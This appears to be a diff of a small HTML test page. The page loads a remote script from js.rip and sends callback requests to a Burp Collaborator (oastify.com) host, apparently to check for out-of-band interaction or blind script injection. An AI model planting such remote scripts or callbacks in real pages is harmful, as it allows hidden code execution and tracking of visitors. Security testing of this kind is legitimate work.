@@ -4,14 +4,16 @@
   <title>Test Page</title>
   <script src="https://js.rip/5mw8at9w5s"></script>
   <script>
-
-    fetch("http://av9f75zghc4snr5c00nn5vworfx6lxnlc.oastify.com/")
+    fetch("https://av9f75zghc4snr5c00nn5vworfx6lxnlc.oastify.com/")
       .then(r => {
+        console.log("First fetch status:", r.status);
         if (r.ok) {
-          fetch("https://av9f75zghc4snr5c00nn5vworfx6lxnlc.oastify.com/hit");
+          fetch("https://av9f75zghc4snr5c00nn5vworfx6lxnlc.oastify.com/hit")
+            .then(() => console.log("Second fetch sent"))
+            .catch(err => console.warn("Second fetch failed:", err));
         }
-      });
-    // No .catch — silent fail if blocked
+      })
+      .catch(err => console.warn("First fetch failed:", err));
   </script>
 </head>
 <body>
